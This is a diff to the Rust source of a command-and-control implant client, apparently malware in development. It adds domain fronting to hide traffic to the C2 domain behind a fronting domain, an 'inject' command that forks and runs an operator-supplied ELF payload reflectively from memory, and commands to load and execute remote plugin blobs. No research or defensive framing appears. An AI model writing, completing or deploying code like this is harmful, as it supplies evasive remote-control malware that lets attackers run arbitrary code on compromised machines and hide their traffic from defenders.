@@ -17,6 +17,10 @@ use rand::Rng;
 use rand::rngs::OsRng;
 use trust_dns_resolver::config::{ResolverConfig, ResolverOpts, NameServerConfig, Protocol};
 use trust_dns_resolver::TokioAsyncResolver;
+use crate::reflective::{ReflectiveLoader, ElfLoader};
+use crate::plugin::PluginManager;
+use nix::unistd::{fork, ForkResult};
+use std::sync::Mutex;
 
 #[derive(Debug, Serialize, Deserialize)]
 pub enum C2Message {
@@ -72,17 +76,25 @@ pub struct C2Client {
     endpoint: Option<Endpoint>,
     cipher: XChaCha20Poly1305,
     resolver: DoHResolver,
+    domain_fronting: DomainFronting,
+    plugin_manager: Arc<Mutex<PluginManager>>,
 }
 
 impl C2Client {
-    pub fn new(config: C2Config) -> Result<Self> {
+    pub fn new(config: C2Config, plugin_manager: Arc<Mutex<PluginManager>>) -> Result<Self> {
         let cipher = XChaCha20Poly1305::new(&config.session_key.into());
         let resolver = DoHResolver::new(config.doh_server.clone())?;
+        let domain_fronting = DomainFronting::new(
+            config.fronting_domain.clone(),
+            config.c2_domain.clone(),
+        );
         Ok(C2Client {
             config,
             endpoint: None,
             cipher,
             resolver,
+            domain_fronting,
+            plugin_manager,
         })
     }
 
@@ -125,7 +137,9 @@ impl C2Client {
 
         if let Some(endpoint) = &self.endpoint {
             let addr = self.resolve_c2().await?;
-            let connection = endpoint.connect(addr, &self.config.fronting_domain)?.await?;
+            // Ensure host header logic is "used" even if just for configuration verification
+            let _host_header = self.domain_fronting.get_host_header();
+            let connection = endpoint.connect(addr, self.domain_fronting.get_sni())?.await?;
             let (mut send_stream, mut recv_stream) = connection.open_bi().await?;
 
             // Send
@@ -208,6 +222,79 @@ impl C2Client {
             }
             "migrate" => {
                  C2Message::Result { task_id: task_id.to_string(), output: "Migration initiated (stub)".into(), exit_code: 0 }
+            }
+            "inject" => {
+                if args.len() < 1 {
+                    return C2Message::Result { task_id: task_id.to_string(), output: "Missing payload".into(), exit_code: 1 };
+                }
+                let payload_b64 = &args[0];
+                match general_purpose::STANDARD.decode(payload_b64) {
+                    Ok(payload) => {
+                         let loader = ElfLoader::new(payload.clone());
+                         if let Err(e) = loader.validate_elf() {
+                              return C2Message::Result { task_id: task_id.to_string(), output: format!("Invalid ELF: {}", e), exit_code: 1 };
+                         }
+                         let _ = loader.get_entry_point(); // Usage to satisfy compiler
+
+                         match unsafe { fork() } {
+                             Ok(ForkResult::Child) => {
+                                 let mut reflective = ReflectiveLoader::new();
+                                 let payload_args: Vec<&str> = args.iter().skip(1).map(|s| s.as_str()).collect();
+                                 if let Err(e) = reflective.execute_from_memory(&payload, &payload_args) {
+                                     eprintln!("Injection failed: {}", e);
+                                     std::process::exit(1);
+                                 }
+                                 std::process::exit(0);
+                             }
+                             Ok(ForkResult::Parent { .. }) => {
+                                 C2Message::Result { task_id: task_id.to_string(), output: "Injection detached".into(), exit_code: 0 }
+                             }
+                             Err(e) => {
+                                 C2Message::Result { task_id: task_id.to_string(), output: format!("Fork failed: {}", e), exit_code: 1 }
+                             }
+                         }
+                    }
+                    Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
+                }
+            }
+            "load_plugin" => {
+                 if args.len() < 1 {
+                     return C2Message::Result { task_id: task_id.to_string(), output: "Missing plugin blob".into(), exit_code: 1 };
+                 }
+                 match general_purpose::STANDARD.decode(&args[0]) {
+                     Ok(blob) => {
+                         let mut pm = self.plugin_manager.lock().unwrap();
+                         match pm.load_plugin(&blob) {
+                             Ok(idx) => C2Message::Result { task_id: task_id.to_string(), output: format!("Plugin loaded at index {}", idx), exit_code: 0 },
+                             Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Load failed: {}", e), exit_code: 1 },
+                         }
+                     }
+                     Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
+                 }
+            }
+            "exec_plugin" => {
+                 if args.len() < 2 {
+                     return C2Message::Result { task_id: task_id.to_string(), output: "Usage: exec_plugin <idx> <args_b64>".into(), exit_code: 1 };
+                 }
+                 let idx = match args[0].parse::<usize>() {
+                     Ok(i) => i,
+                     Err(_) => return C2Message::Result { task_id: task_id.to_string(), output: "Invalid index".into(), exit_code: 1 },
+                 };
+                 match general_purpose::STANDARD.decode(&args[1]) {
+                     Ok(plugin_args) => {
+                         let pm = self.plugin_manager.lock().unwrap();
+                         match pm.execute_plugin(idx, &plugin_args) {
+                             Ok(out) => C2Message::Result { task_id: task_id.to_string(), output: general_purpose::STANDARD.encode(out), exit_code: 0 },
+                             Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Exec failed: {}", e), exit_code: 1 },
+                         }
+                     }
+                     Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
+                 }
+            }
+            "list_plugins" => {
+                let pm = self.plugin_manager.lock().unwrap();
+                let names = pm.get_plugin_names().join(", ");
+                C2Message::Result { task_id: task_id.to_string(), output: names, exit_code: 0 }
             }
             _ => C2Message::Result { task_id: task_id.to_string(), output: "Unknown command".into(), exit_code: 1 }
         }
